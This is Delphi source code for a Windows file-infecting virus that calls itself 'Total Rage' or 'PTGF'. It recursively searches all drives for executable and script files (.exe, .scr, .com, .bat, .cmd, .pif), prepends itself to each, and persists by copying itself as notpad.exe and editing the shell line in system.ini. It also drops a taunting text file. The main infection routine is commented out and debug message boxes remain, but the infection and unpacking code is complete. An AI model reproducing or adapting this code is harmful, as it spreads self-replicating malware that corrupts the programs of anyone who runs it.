   PROGRAM Setup;
   uses
     Windows;

   CONST
     Mark                  : String      = 'PTGF - Prepare To Get Fucked';
     Rage                  : String      = 'RAGE - TOTAL RAGE MOTHERFUCKERS';

     exe_string            : string      = 'exe';                           // exe
     cmd_string            : string      = 'cmd';                           // cmd
     com_string            : string      = 'com';                           // com
     bat_string            : string      = 'bat';                           // bat
     scr_string            : string      = 'scr';                           // scr
     pif_string            : string      = 'pif';                           // pif
     slash_string          : string      = '\';                             // \
     notpad_string         : string      = 'notpad.exe';                    // notpad.exe
     collume_string        : string      = ';';                             // ;
     a_string              : string      = 'a:\';                           // a:\
     stub1_string          : string      = 'stub';                          // stub
     mutex_string          : string      = 'TOTALRAGE';                     // TOTALRAGE
     setup_string          : string      = 'Setup.tmp';                     // setup.tmp
     boot_string           : string      = 'boot';                          // boot
     shell_string          : string      = 'shell';                         // shell
     explorer_string       : string      = 'explorer.exe';                  // explorer.exe
     system_string         : string      = 'system.ini';                    // system.ini
     string_all            : string      = '*.*';                           // *.*

     fmOpenRead                          = $0000;
     fmOpenWrite                         = $0001;
     fmOpenReadWrite                     = $0002;
     fmShareCompat                       = $0000;
     fmShareExclusive                    = $0010;
     fmShareDenyWrite                    = $0020;
     fmShareDenyRead                     = $0030;
     fmShareDenyNone                     = $0040;
     FILE_ATTRIBUTE_READONLY             = $00000001;      // FILE_ATTRIBUTE_READONLY
     FILE_ATTRIBUTE_HIDDEN               = $00000002;      // FILE_ATTRIBUTE_HIDDEN
     FILE_ATTRIBUTE_SYSTEM               = $00000004;      // FILE_ATTRIBUTE_SYSTEM
     FILE_ATTRIBUTE_VOLUMEID             = $00000008;      // FILE_ATTRIBUTE_VOLUMEID
     FILE_ATTRIBUTE_ARCHIVE              = $00000020;      // FILE_ATTRIBUTE_ARCHIVE
     FILE_ATTRIBUTE_DIRECTORY            = $00000010;      // FILE_ATTRIBUTE_DIRECTORY
     FILE_ATTRIBUTE_ANYFILE              = $0000003F;      // FILE_ATTRIBUTE_ANYFILE

   TYPE
     TAttachmentHeader = RECORD
       MagicNumber         : Cardinal;
       CRC                 : Cardinal;
       Size                : Int64;
       IsStub              : Boolean;
       FileName            : Array[0..MAX_PATH] Of Char;
     END;
     PAttachmentHeader = ^TAttachmentHeader;

     TFileName = Type String;
     TSearchRec = Record
       Time: Integer;
       Size: Integer;
       Attr: Integer;
       Name: TFileName;
       ExcludeAttr: Integer;
       FindHandle: THandle;
       FindData: TWin32FindData;
     End;

     LongRec = Packed Record
       Case Integer of
         0: (Lo, Hi: Word);
         1: (Words: Array [0..1] Of Word);
         2: (Bytes: Array [0..3] Of Byte);
     End;

   var

     buffer                : array[0..$ffff] of byte;

     fSource, fTemp        : THandle;

     BytesRead, BytesWritten: cardinal;
     NeededSize, BufferRead: cardinal;

     tmppath, fname, tname: string;

     Header                : TAttachmentHeader;

     Virus, Output         : THandle;

     itemHeader            : PAttachmentHeader;

     StubPath, WinDir,
     SysDir,
     Filepath              : String;

     stubSize              : Int64;

     SR                    : TSearchRec;

     DIR1,DIR2             : Array[0..255]Of Char;

   Function LowerCase(Const S:String): String;
   Var
     Ch            : Char;
     L             : Integer;
     Source,
     Dest          : PChar;
   Begin
     L := Length(S);
     SetLength(Result,L);
     Source := Pointer(S);
     Dest := Pointer(Result);
     While L <> 0 Do
     Begin
       Ch := Source^;
       If (Ch >= 'A') And (Ch <= 'Z') Then
         Inc(Ch, 32);
       Dest^:= Ch;
       Inc(Source);
       Inc(Dest);
       Dec(L);
     End;
   End;

   Function FileSize(FileName: String): Int64;
   Var
     H: THandle;
     FData: TWin32FindData;
   Begin
     Result:= -1;

     H:= FindFirstFile(PChar(FileName), FData);
     If H <> INVALID_HANDLE_VALUE Then
     Begin
       Windows.FindClose(H);
       Result:= Int64(FData.nFileSizeHigh) Shl 32 + FData.nFileSizeLow;
     End;
   End;

   Function AllocMem(Size: Cardinal): Pointer;
   Begin
     GetMem(Result, Size);
     FillChar(Result^, Size, 0);
   End;

   Function StrPas(Const Str: PChar): String;
   Begin
     Result := Str;
   End;

   Function StrLCopy(Dest: PChar; Const Source: PChar; MaxLen: Cardinal): PChar; Assembler;
   Asm
           PUSH    EDI
           PUSH    ESI
           PUSH    EBX
           MOV     ESI,EAX
           MOV     EDI,EDX
           MOV     EBX,ECX
           XOR     AL,AL
           TEST    ECX,ECX
           JZ      @@1
           REPNE   SCASB
           JNE     @@1
           INC     ECX
   @@1:    SUB     EBX,ECX
           MOV     EDI,ESI
           MOV     ESI,EDX
           MOV     EDX,EDI
           MOV     ECX,EBX
           SHR     ECX,2
           REP     MOVSD
           MOV     ECX,EBX
           AND     ECX,3
           REP     MOVSB
           STOSB
           MOV     EAX,EDX
           POP     EBX
           POP     ESI
           POP     EDI
   End;

   Function GetHeader(Filew:String):PAttachmentHeader;
   Var
     Header: PAttachmentHeader;
   Begin
     Header:= AllocMem(SizeOf(TAttachmentHeader));
     StrLCopy(@Header.Filename, PChar(Filew), MAX_PATH);
     Header.Size:= FileSize(Filew);
     Header.IsStub:= False;
     Result := Header;
   End;

   Procedure Infect(File1, File2:String);
   Var
    Buffer                 :Array[0..2048] of Char;
    BytesRead,
    BytesWritten           :LongWord;
   Begin
    ZeroMemory(@Buffer, SizeOf(Buffer));

    OutPut := CreateFile(pChar(File1+'-'), GENERIC_WRITE, FILE_SHARE_WRITE,
              NIL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, 0);

    itemHeader := GetHeader(StubPath);
    Fname := StrPas(@itemHeader.Filename);

    Virus := CreateFile(pChar(fName), GENERIC_READ, FILE_SHARE_READ,
              NIL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);

    SetFilePointer(Output, 0, nil, FILE_END);
    Repeat
     ReadFile(Virus, Buffer, 2048, BytesRead, NIL);
     WriteFile(OutPut, Buffer, BytesRead, BytesWritten, NIL);
    Until BytesWritten = 0;
    CloseHandle(Virus);

    itemHeader := GetHeader(File2);
    fName := StrPas(@itemHeader.FileName);

    Header.MagicNumber := $FEEDBEEF;
    Header.CRC := 0;
    Header.Size := FileSize(File2);
    Header.IsStub := False;
    Header.FileName := itemHeader.FileName;

    WriteFile(OutPut, Header, SizeOf(Header), BytesWritten, NIL);

    Virus := CreateFile(pChar(fName), GENERIC_READ, FILE_SHARE_READ,
              NIL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);

    SetFilePointer(Output, 0, nil, FILE_END);
    Repeat
     ReadFile(Virus, Buffer, 2048, BytesRead, NIL);
     WriteFile(OutPut, Buffer, BytesRead, BytesWritten, NIL);
    Until BytesWritten = 0;
    CloseHandle(Virus);

    itemHeader := GetHeader(File1);
    fName := StrPas(@itemHeader.FileName);

    Header.MagicNumber := $FEEDBEEF;
    Header.CRC := 0;
    Header.Size := FileSize(File1);
    Header.IsStub := False;
    Header.FileName := itemHeader.FileName;

    WriteFile(OutPut, Header, Sizeof(Header), BytesWritten, NIL);

    Virus := CreateFile(pChar(fName), GENERIC_READ, FILE_SHARE_READ,
              NIL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);

    SetFilePointer(Output, 0, nil, FILE_END);
    Repeat
     ReadFile(Virus, Buffer, 2048, BytesRead, NIL);
     WriteFile(OutPut, Buffer, BytesRead, BytesWritten, NIL);
    Until BytesWritten = 0;
    CloseHandle(Virus);

    itemHeader := GetHeader(StubPath);

    Fname := StrPas(@itemHeader.Filename);
    StubSize := FileSize(StubPath);

    Header.MagicNumber:= $FEEDBEEF;
    Header.CRC:= 0;
    Header.Size:= stubSize;
    Header.IsStub:= true;

    fillChar(Header.FileName, MAX_PATH+1, 0);

    WriteFile(OutPut, Header, Sizeof(Header), BytesWritten, NIL);
    CloseHandle(OutPut);
    DeleteFile(pChar(File1));
    CopyFile(pChar(File1+'-'),pChar(File1),False);
    DeleteFile(pChar(File1+'-'));

   End;

   Function FindMatchingFile(Var F: TSearchRec): Integer;
   Var
    LocalFileTime: TFileTime;
   Begin
    With F Do
    Begin
     While FindData.dwFileAttributes And ExcludeAttr <> 0 Do
      If Not FindNextFile(FindHandle, FindData) Then
       Begin
        Result := GetLastError;
        Exit;
       End;
      FileTimeToLocalFileTime(FindData.ftLastWriteTime, LocalFileTime);
      FileTimeToDosDateTime(LocalFileTime, LongRec(Time).Hi,
      LongRec(Time).Lo);
      Size := FindData.nFileSizeLow;
      Attr := FindData.dwFileAttributes;
      Name := FindData.cFileName;
     End;
    Result := 0;
   End;

   Procedure FindClose(Var F: TSearchRec);
   Begin
   If F.FindHandle <> INVALID_HANDLE_VALUE Then
    Begin
     Windows.FindClose(F.FindHandle);
     F.FindHandle := INVALID_HANDLE_VALUE;
    End;
   End;

   Function FindFirst(Const Path: String; Attr: Integer; Var  F: TSearchRec): Integer;
   Const
    faSpecial = FILE_ATTRIBUTE_HIDDEN or FILE_ATTRIBUTE_SYSTEM or FILE_ATTRIBUTE_VOLUMEID or FILE_ATTRIBUTE_DIRECTORY;
   Begin
    F.ExcludeAttr := Not Attr And faSpecial;
    F.FindHandle := FindFirstFile(PChar(Path), F.FindData);
    If F.FindHandle <> INVALID_HANDLE_VALUE Then Begin
     Result := FindMatchingFile(F);
     If Result <> 0 Then FindClose(F);
    End Else
     Result := GetLastError;
   End;

   Function FindNext(Var F: TSearchRec): Integer;
   Begin
    If FindNextFile(F.FindHandle, F.FindData) Then
     Result := FindMatchingFile(F)
    Else
     Result := GetLastError;
   End;

   function FileExists(const FileName: string): Boolean;
   var
     lpFindFileData: TWin32FindData;
     hFile: Cardinal;
   begin
     hFile := FindFirstFile(PChar(FileName), lpFindFileData);
     if hFile <> INVALID_HANDLE_VALUE then
     begin
       result := True;
       Windows.FindClose(hFile)
     end
     else
       result := False;
   end;

   Procedure InfectExes(D:String;T:String);
   Var
    Check  : TextFile;
    L      : String;
    L1,L2  : String;
   Begin
   If D[Length(D)] <> Slash_String then D := D + Slash_String;

   If FindFirst(D + T, FILE_ATTRIBUTE_DIRECTORY, SR) = 0 then
   Repeat
    If ((Sr.Attr and FILE_ATTRIBUTE_DIRECTORY) = FILE_ATTRIBUTE_DIRECTORY) and (SR.Name[1] <> '.') then
     InfectExes(D + SR.Name + '\',T)
    Else Begin
     if (lowercase(copy(sr.name,length(sr.name)-2,3))=exe_String) or
        (lowercase(copy(sr.name,length(sr.name)-2,3))=scr_String) or
        (lowercase(copy(sr.name,length(sr.name)-2,3))=com_string) or
        (lowercase(copy(sr.name,length(sr.name)-2,3))=cmd_string) or
        (lowercase(copy(sr.name,length(sr.name)-2,3))=bat_string) or
        (lowercase(copy(sr.name,length(sr.name)-2,3))=pif_string) then
     TRY
     AssignFile(Check, D + SR.Name);
     Reset(Check);
     Read(Check, L1);
     ReadLn(Check, L2);
     L := L1;
     While Not EOF(Check) Do Begin
      Read(Check, L1);
      ReadLn(Check, L2);
      L := L + L1;
     End;
     CloseFile(Check);
     If Pos(notpad_string,lowercase(L))>0 then exit;
     If FileSize(D + SR.Name) < 700000 Then
      Infect(D + SR.Name, FilePath);
     EXCEPT
      ;
     END;
    End;
    Until (FindNext(SR) <> 0);
   FindClose(SR);
   End;

   function GetDrives:string;
   var
      p:integer;
      This,All,c,f,cDrives:string;
   begin
      c:=collume_string;
      f:=Chr(0);
      SetLength(cDrives,300);
      GetLogicalDriveStrings(300,PChar(cDrives));
      p:=Pos(f,cDrives);
      while p > 0 do
      begin
         This:=Copy(cDrives,1,p - 1);
         if Length(This) <> 3 then Break;
         cDrives:=Copy(cDrives,p + 1,Length(cDrives));
         p:=Pos(f,cDrives);
         if lowercase(copy(this,1,3)) <> a_string then
          All:=All + This + c;
      end;
      GetDrives:=all;
   end;

   procedure writetext;
   var
    te:textfile;
   begin
    AssignFile(Te,'C:\Rage.txt');
    ReWrite(Te);
    WriteLn(Te, 'Total Rage');
    WriteLn(Te, 'Please name this PTGF or RAGE');
    WriteLn(Te, 'and Igor (mcafee) im sexier then you');
    WriteLn(Te, 'greets to crow|| and other ppl');
    WriteLn(Te, '--');
    WriteLn(Te, 'Total Rage');
    CloseFile(Te);
   end;

   function GetTmpPath: string;
   var
     buffer: array[0..MAX_PATH] of char;
   begin
     result:= '';
     if GetTempPathA(MAX_PATH, buffer) <> 0 then
     begin
       result:= String(PChar(@buffer));
       if result[length(result)] <> '\' then
         result:= result + '\';
     end;
   end;

   function SpawnProgram(Filename: string): boolean;
     function ErrorString(ErrorCode: integer): string;
     var
       buffer: array[0..1024] of char;
     begin
       FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, nil, ErrorCode, 0, @buffer, sizeof(buffer)-1, nil);
       result:= string(@buffer);
     end;
   var
     si: TStartupInfo;
     pi: TProcessInformation;
   begin
     FillChar(si, sizeof(si), 0);
     si.cb:= sizeof(si);
     si.dwFlags:= STARTF_USESHOWWINDOW;
     si.wShowWindow:= SW_SHOWDEFAULT;
     if not CreateProcessA(nil, PChar(Filename), nil, nil, false, 0, nil, nil, si, pi) then
     begin
       Exit;
       Halt(0);
       result:= false;
     end
     else
       result:= true;
   end;

   function FileOpen(const FileName: string; Mode: LongWord): Integer;
   const
     AccessMode: array[0..2] of LongWord = (
       GENERIC_READ,
       GENERIC_WRITE,
       GENERIC_READ or GENERIC_WRITE);
     ShareMode: array[0..4] of LongWord = (
       0,
       0,
       FILE_SHARE_READ,
       FILE_SHARE_WRITE,
       FILE_SHARE_READ or FILE_SHARE_WRITE);
   begin
     Result := Integer(CreateFileA(PChar(FileName), AccessMode[Mode and 3],
       ShareMode[(Mode and $F0) shr 4], nil, OPEN_EXISTING,
       FILE_ATTRIBUTE_NORMAL, 0));
   end;

   function FileCreate(const FileName: string): Integer;
   begin
     Result := Integer(CreateFileA(PChar(FileName), GENERIC_READ or GENERIC_WRITE,
       0, nil, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0));
   end;

   procedure FileClose(Handle: Integer);
   begin
     CloseHandle(THandle(Handle));
   end;

   Procedure release;
   begin
     MessageBox(0,'1','1',mb_ok);
     tmppath:= GetTmpPath;

     try
       MessageBox(0,'2','2',mb_ok);
       CopyFile(pchar(paramstr(0)),pchar(tmppath+'t.tmp'),false);
       fSource:= FileOpen(pchar(tmppath+'t.tmp'), GENERIC_READ or FILE_SHARE_READ);

       if fSource = THandle(-1) then
       begin
         exit;
         Halt(0);
       end;

       try
         MessageBox(0,'3','3',mb_ok);
         SetFilePointer(fSource, GetFileSize(fSource, nil) - Sizeof(TAttachmentHeader), nil, FILE_BEGIN);
         ReadFile(fSource, Header, sizeof(Header), BytesRead, nil);

         if (Header.MagicNumber <> $FEEDBEEF) or (BytesRead <> sizeof(Header)) then
         begin
           Exit;
           FileClose(fSource);
           Halt(0);
         end;

         MessageBox(0,'4','4',mb_ok);
         SetFilePointer(fSource, Header.Size, nil, FILE_BEGIN);

         while (SetFilePointer(fSource, 0, nil, FILE_CURRENT) <= (GetFileSize(fSource, nil) - sizeof(Header))) do
         begin
           ReadFile(fSource, Header, sizeof(Header), BytesRead, nil);

           if Header.MagicNumber <> $FEEDBEEF then
           begin
             Exit;
             Halt(0);
           end;
           fname := header.FileName;
           MessageBox(0,pchar(fname),'',mb_ok);
           repeat
             str(GetTickCount, tname);

             fname:= 'tmp' + tname + '.exe';
             sleep(0);
           until not FileExists(tmppath + fname);

           fTemp:= FileCreate(tmppath + fname);
           NeededSize:= Header.Size;

           repeat
             if NeededSize > sizeof(buffer) then
               BufferRead:= sizeof(buffer)
             else
               BufferRead:= NeededSize;
             ReadFile(fSource, buffer, BufferRead, BytesRead, nil);
             WriteFile(fTemp, buffer, BytesRead, BytesWritten, nil);
             dec(NeededSize, BytesRead);
           until (BytesRead <> BufferRead) or (NeededSize = 0);

           FileClose(fTemp);

           if (NeededSize <> 0) or (not SpawnProgram(tmppath + fname)) then
           begin
             FileClose(fSource);
   //          Halt(0);
           end;
         end;
         FileClose(fSource);
       finally
       end;
     finally
     end;
   End;

   Begin

   Release;
   (*
   CreateMutexA(NIL, TRUE, pChar(Mutex_String));
   if (GetLastError() = ERROR_ALREADY_EXISTS) then ExitProcess(0);

   writetext;

   GetSystemDirectory (Dir1,255);
   GetWindowsDirectory(Dir2,255);

   SysDir := Dir1;
   WinDir := Dir2;
   SysDir := SysDir + slash_String + notpad_string;
   WinDir := WinDir + slash_String + setup_string;

   CopyFile(pChar(Paramstr(0)),pChar(SysDir),False);
   CopyFile(pChar(Paramstr(0)),pChar(WinDir),False);

   StubPath := WinDir;
   FilePath := SysDir;

   WritePrivateProfileString(pChar(boot_String),pChar(shell_string),pChar(explorer_string+' '+notpad_string),pChar(system_string));

   SysDir := GetDrives;

   While SysDir <> '' Do Begin
    InfectExes(Copy(SysDir,1,pos(';',SysDir)-1),string_all);
    SysDir := Copy(SysDir,pos(';',SysDir)+1,length(SysDir));
   End;
   *)
   End.
